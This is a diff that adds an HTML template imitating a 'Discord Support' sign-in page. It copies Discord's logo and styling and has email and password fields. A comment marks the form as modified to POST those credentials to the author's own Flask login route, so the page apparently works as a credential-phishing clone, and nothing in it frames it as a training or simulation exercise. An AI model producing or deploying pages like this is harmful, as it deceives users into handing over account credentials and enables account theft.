@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Support - Sign in</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #2e3338;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 40px 16px;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 500px;
+            border: 1px solid #e3e5e8;
+            border-radius: 8px;
+            padding: 32px 36px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.04);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Discord Logo Badge */
+        .logo-container {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .discord-logo {
+            width: 100%;
+            height: 100%;
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #060607;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        .switch-link {
+            font-size: 13px;
+            color: #0068d6;
+            text-decoration: none;
+            margin-bottom: 24px;
+        }
+
+        .switch-link:hover {
+            text-decoration: underline;
+        }
+
+        .header-divider {
+            width: 100%;
+            height: 1px;
+            background-color: #f0f1f2;
+            margin-bottom: 24px;
+        }
+
+        /* Form Styling */
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            width: 100%;
+        }
+
+        .input-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #2e3338;
+        }
+
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 40px;
+            padding: 0 12px;
+            background-color: #ffffff;
+            border: 1px solid #1f73b7;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+            color: #2e3338;
+            box-shadow: 0 0 0 2px rgba(31, 115, 183, 0.2);
+        }
+
+        .input-field.secondary {
+            border: 1px solid #c2c8d0;
+            box-shadow: none;
+        }
+
+        .input-field.secondary:focus {
+            border-color: #1f73b7;
+            box-shadow: 0 0 0 2px rgba(31, 115, 183, 0.2);
+        }
+
+        .eye-btn {
+            position: absolute;
+            right: 12px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #747f8d;
+            display: flex;
+            align-items: center;
+        }
+
+        .forgot-link {
+            font-size: 13px;
+            color: #0068d6;
+            text-decoration: none;
+            align-self: flex-start;
+            margin-top: -6px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-submit {
+            width: 100%;
+            height: 40px;
+            background-color: #2271b1;
+            border: none;
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 6px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: #135e96;
+        }
+
+        /* Card Bottom Footer Links */
+        .footer-links {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-top: 16px;
+            font-size: 13px;
+            color: #4f5660;
+        }
+
+        .footer-links a {
+            color: #0068d6;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <main class="login-card">
+        <!-- Discord Official Logo -->
+        <div class="logo-container">
+            <svg class="discord-logo" viewBox="0 0 127.14 96.36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#5865F2" d="M107.7 8.07A105.15 105.15 0 0081.47 0a72.06 72.06 0 00-3.36 6.83 97.68 97.68 0 00-29.11 0A72.37 72.37 0 0045.64 0a105.89 105.89 0 00-26.25 8.09C2.79 32.65-1.71 56.6.54 80.21a105.73 105.73 0 0032.17 16.15 77.7 77.7 0 006.89-11.11 68.42 68.42 0 01-10.85-5.18c.91-.66 1.8-1.34 2.66-2a69.8 69.8 0 0058.07 0c.87.67 1.75 1.35 2.66 2a68.68 68.68 0 01-10.87 5.19 77 77 0 006.89 11.1 105.25 105.25 0 0032.19-16.14c2.64-27.38-4.51-51.11-18.91-72.15zM42.45 65.69c-6.4 0-11.66-5.88-11.66-13.09 0-7.22 5.14-13.1 11.66-13.1 6.57 0 11.77 5.94 11.66 13.1 0 7.21-5.14 13.09-11.66 13.09zm42.24 0c-6.4 0-11.66-5.88-11.66-13.09 0-7.22 5.14-13.1 11.66-13.1 6.57 0 11.77 5.94 11.66 13.1 0 7.21-5.14 13.09-11.66 13.09z"/>
+            </svg>
+        </div>
+
+        <h1 class="title">Sign in to Discord Support</h1>
+        <a href="#" class="switch-link">Switch to agent sign-in</a>
+
+        <div class="header-divider"></div>
+
+        <!-- MODIFIED FORM: action points to Flask route, POST method, inputs have names -->
+        <form class="login-form" action="{{ url_for('login') }}" method="POST">
+            <div class="input-group">
+                <label class="input-label" for="email">Email* (required)</label>
+                <input type="email" id="email" name="username" class="input-field" autoFocus required />
+            </div>
+
+            <div class="input-group">
+                <label class="input-label" for="password">Password*</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" name="password" class="input-field secondary" required />
+                    <button type="button" class="eye-btn" id="toggle-pwd" aria-label="Toggle password visibility">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <a href="#" class="forgot-link">Forgot password?</a>
+
+            <button type="submit" class="btn-submit">Sign in</button>
+
+            <div class="footer-links">
+                <div>Emailed us for support? <a href="#">Request password</a></div>
+                <div>New to Discord Support? <a href="#">Sign up</a></div>
+            </div>
+        </form>
+    </main>
+
+    <script>
+        const passwordInput = document.getElementById('password');
+        const togglePwd = document.getElementById('toggle-pwd');
+
+        togglePwd.addEventListener('click', () => {
+            const isPassword = passwordInput.getAttribute('type') === 'password';
+            passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
+        });
+    </script>
+</body>
+</html>
